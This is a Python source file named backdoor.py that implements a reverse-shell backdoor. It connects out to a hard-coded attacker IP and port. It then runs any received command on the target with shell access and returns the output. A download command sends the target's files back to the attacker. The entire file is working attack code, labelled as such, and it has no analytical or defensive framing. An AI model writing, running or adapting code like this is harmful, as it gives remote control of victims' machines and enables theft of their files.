# backdoor.py
import socket
import subprocess
import os
import base64 # For encode and decode message to notify the attacker

# Function to execute system commands on the target machine
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        return f"Error: {e}".encode()

def base64_encode(encode_message):
    encoded_message = base64.b64encode(encode_message.encode('utf-8'))
    return encoded_message

# Function to handle file download (sending file to the attacker)
def download_file(filename, conn):
    if os.path.exists(filename):
        with open(filename, 'rb') as file:
            #conn.sendall('Start Downloading...').encode('utf-8')  # Notify the attacker that file transfer is starting
            print('Start Download...')
            chunk = file.read(1024)

            while chunk:
                conn.send(base64.b64encode("Downloading".encode('utf-8')))
                conn.send(chunk)
                chunk = file.read(1024)
            #conn.sendall(b"END_FILE_TRANSFER")  # Notify the attacker that file transfer is complete
            print('File download success!')
            #conn.send(base64.b64encode("Success".encode('utf-8')))
            #conn.sendall('File Downloaded!').encode('utf-8')

        handle_commands(conn)
    else:
        print('File not Found!')
        conn.send(base64.b64encode("File not found".encode('utf-8')))
        handle_commands(conn)

    # After download is complete, call the `handle_commands` function again


# Function to handle all incoming commands in a loop
def handle_commands(conn):
    print('Handle Command')
    while True:
        try:
            # Receive the command sent from the attacker
            command = conn.recv(1024).decode('utf-8')

            # Exit condition
            if command.lower() == 'exit':
                break

            # Handle file download request
            elif command.startswith("download "):
                filename = command.split(" ")[1]
                download_file(filename, conn)  # Call download function and pass control

            # For all other commands, execute and send result back to the attacker
            else:
                command_result = execute_system_command(command)
                conn.send(command_result)

        except Exception as e:
            conn.send(f"Error: {e}".encode())
            break

    # Close the connection when the loop exits
    conn.close()

# Establish connection to the attacker's machine
print('Connecting...')
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.199.133", 4444))  # Replace with your attacker's IP and port
print('Connected!')

# Start handling commands
handle_commands(connection)